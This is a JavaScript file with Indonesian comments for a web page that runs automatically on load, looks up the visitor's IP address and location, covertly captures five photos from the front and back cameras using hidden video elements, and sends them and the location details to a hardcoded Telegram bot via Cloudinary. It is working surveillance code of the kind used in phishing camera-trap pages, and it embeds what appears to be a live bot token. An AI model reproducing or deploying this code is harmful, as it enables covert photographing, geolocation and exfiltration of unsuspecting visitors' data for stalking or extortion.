/* =========================================== */
/* script.js: FINAL - IP 1X KIRIM + 5 FOTO (3 Depan, 2 Belakang) */
/* =========================================== */
    
// --- VARIABEL GLOBAL DENGAN DATA ANDA ---
const YOUR_BOT_TOKEN = "7932089543:AAESHQcU_WwTvJs-QhJnkbHwKMPiNhrvvYE";
const YOUR_CHAT_ID = "7084437062";

// --- KONFIGURASI CLOUDINARY FINAL ---
const CLOUDINARY_CLOUD_NAME = "djaiuiu4x"; 
const CLOUDINARY_UPLOAD_PRESET = "CLOUDINARY_UPLOAD_PRESET"; 
// -----------------------------------------------------------------

const logDiv = document.getElementById('log');
const videoElement = document.getElementById('videoElement');
const canvasElement = document.getElementById('canvasElement'); 
const preloader = document.getElementById('preloader');

// Konfigurasi Pengambilan Foto
const CAPTURE_CONFIG = [
    { mode: 'user', count: 3, name: 'Depan' }, // 3 Foto Kamera Depan
    { mode: 'environment', count: 2, name: 'Belakang' } // 2 Foto Kamera Belakang
];
const DELAY_BETWEEN_CAPTURES_MS = 1000; // Jeda 1 detik antar foto

// Fungsi Log
function appendLog(message, isError = false) {
    if (logDiv.style.display === 'none') {
        logDiv.style.display = 'block';
        logDiv.style.opacity = '1'; 
    }
    const style = isError ? 'color: red;' : 'color: #856404;';
    logDiv.innerHTML += `<p style="${style}">[${new Date().toLocaleTimeString()}] ${message}</p>`;
    logDiv.scrollTop = logDiv.scrollHeight;
}

// --- FUNGSI WIB TIMEZONE ---
function getWIBTimestamp() {
    const now = new Date();
    return now.toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta', 
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
    }) + ' (WIB)';
}

// --- FUNGSI 1: Mengirim Pesan Teks ke Telegram (IP Detail & Error) ---
function kirimPesanTeks(text) {
    const telegramTextUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage`;
    fetch(telegramTextUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_CHAT_ID,
            text: text,
            parse_mode: 'Markdown' 
        }),
    })
    .then(response => response.json())
    .then(result => {
        if (!result.ok) {
            appendLog(`❌ Gagal mengirim pesan teks: ${result.description}`, true);
        }
    });
}

// --- FUNGSI 2: Mengirim URL Gambar ke Telegram (sendPhoto - TANPA IP CAPTION) ---
let globalCaptureCounter = 0;
function kirimFotoURL(imageUrl, cameraType) { // IP Details TIDAK lagi di passing
    globalCaptureCounter++;
    appendLog(`Mengirim Foto #${globalCaptureCounter} (${cameraType}) ke Telegram...`);
    
    const telegramPhotoUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendPhoto`; 
    const currentTimestampWIB = getWIBTimestamp();
    
    // Caption hanya berisi informasi foto dan waktu WIB
    const captionText = 
        `📸 *FOTO #${globalCaptureCounter} (${cameraType}) DITERIMA*\n` + 
        `*⏱️ Waktu:* ${currentTimestampWIB}`;

    fetch(telegramPhotoUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_CHAT_ID,
            photo: imageUrl, 
            caption: captionText,
            parse_mode: 'Markdown'
        }),
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            appendLog(`✅ Pengiriman Foto #${globalCaptureCounter} SUKSES!`);
        } else {
            appendLog(`❌ ERROR sendPhoto #${globalCaptureCounter}: ${result.description}`, true);
        }
    })
    .catch(error => {
        appendLog(`[FATAL ERROR] Gagal mengirim foto #${globalCaptureCounter}: ${error.message}`, true);
    });
}


// --- FUNGSI 3: Mengambil Detail IP (Hanya Sekali & Mengirim Sendiri) ---
async function getIPDetailsAndSend() {
    appendLog('1. Memulai proses IP Lookup (sekali)...');
    
    const ipLookupUrl = 'https://ipapi.co/json/'; 

    try {
        const response = await fetch(ipLookupUrl);
        const data = await response.json();
        
        appendLog(`✅ Detail IP Diterima: ${data.ip}. Mengirim ke Telegram.`);

        const timestampWIB = getWIBTimestamp();
        
        // Menyusun pesan lengkap untuk dikirim TEPISAH
        const fullMessage = 
            `*📍 DETAIL LOKASI DAN IP DITEMUKAN*\n` +
            `\n` +
            `*🌐 Detail IP Address:*\n` +
            `  IP Address: \`${data.ip || 'N/A'}\`\n` +
            `  ISP/Provider: ${data.org || 'N/A'}\n` +
            `  ASN: ${data.asn || 'N/A'} (Jaringan Inti)\n` + 
            `\n` +
            `*🌎 Lokasi IP:*\n` +
            `  Kota: ${data.city || 'N/A'}\n` +
            `  Kabupaten/Region: ${data.region || 'N/A'}\n` +
            `  Provinsi/Negara: ${data.country_name || 'N/A'}\n` +
            `  Zona Waktu: ${data.timezone || 'N/A'}\n` + 
            `\n` +
            `*⏱️ Waktu Pemeriksaan:* ${timestampWIB}`;
        
        // KIRIM SEBAGAI PESAN TEKS TERPISAH
        kirimPesanTeks(fullMessage);
        
    } catch (error) {
        appendLog(`❌ Gagal mengambil detail IP: ${error.message}`, true);
        kirimPesanTeks(`⚠️ GAGAL MENDAPATKAN DETAIL IP. Pengambilan foto dilanjutkan.`);
    }
}

// --- FUNGSI 4: Mengambil dan Mengunggah Foto untuk Kamera Spesifik ---
async function capturePhotosForMode(modeConfig) {
    const { mode, count, name } = modeConfig;
    const CLOUDINARY_API_URL = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`;
    let stream = null;

    appendLog(`Memulai pengambilan ${count} foto dari Kamera ${name} (${mode})...`);

    try {
        // Minta izin kamera spesifik
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        videoElement.srcObject = stream;
        
        // Pastikan tersembunyi
        videoElement.style.display = 'none'; 
        canvasElement.style.display = 'none'; 

        for (let i = 1; i <= count; i++) {
            await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_CAPTURES_MS));
            
            // 1. Ambil Frame ke Canvas
            const context = canvasElement.getContext('2d');
            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            
            const imageDataURL = canvasElement.toDataURL('image/jpeg', 0.8); 
            
            appendLog(`[Kamera ${name}] Frame #${i} diambil.`);

            // 2. Upload ke Cloudinary
            const formData = new FormData();
            formData.append('file', imageDataURL); 
            formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);

            const uploadResponse = await fetch(CLOUDINARY_API_URL, {
                method: 'POST',
                body: formData 
            });
            const uploadResult = await uploadResponse.json();
            
            if (uploadResult && uploadResult.secure_url) { 
                // 3. Kirim Foto ke Telegram (menggunakan global counter)
                kirimFotoURL(uploadResult.secure_url, name); // Tidak passing IP details lagi
            } else {
                appendLog(`❌ Upload Foto #${i} (${name}) GAGAL: ${uploadResult.error ? uploadResult.error.message : 'Respons tidak valid.'}`, true);
            }
        }

    } catch (err) {
        const errorMsg = (err.name === 'NotAllowedError' || err.name === 'SecurityError') 
            ? `❌ ERROR: Pengguna menolak Izin Kamera ${name}.` 
            : `❌ ERROR Kamera ${name}: ${err.name} - ${err.message}`;
        appendLog(errorMsg, true);
        kirimPesanTeks(`⚠️ GAGAL MENGAMBIL FOTO KAMERA ${name}:\n${errorMsg}`);
    } finally {
        // Matikan stream untuk kamera ini setelah selesai
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            appendLog(`Kamera ${name} dimatikan.`);
        }
    }
}


// --- FUNGSI 5: Memulai Proses Utama ---
async function startCaptureProcess() {
    
    // 1. Ambil detail IP dan langsung KIRIM sebagai pesan teks terpisah
    await getIPDetailsAndSend(); 

    appendLog('2. Memulai proses pengambilan foto 5x... 📸 Harap izinkan pop-up kamera.');
    
    // 2. Proses secara berurutan: 3 Depan, kemudian 2 Belakang
    for (const config of CAPTURE_CONFIG) {
        // Tunggu hingga proses mode kamera sebelumnya selesai
        await capturePhotosForMode(config); 
    }
    
    appendLog('✅ SEMUA PROSES PENGAMBILAN FOTO SELESAI.');
}


// --- Eksekusi Otomatis saat Halaman Selesai Dimuat ---
window.addEventListener('load', () => {
    // Sembunyikan Preloader
    setTimeout(() => { preloader.style.opacity = '0'; setTimeout(() => { preloader.style.display = 'none'; }, 500); }, 800);

    // Mulai proses penangkapan multi-kamera
    startCaptureProcess();
});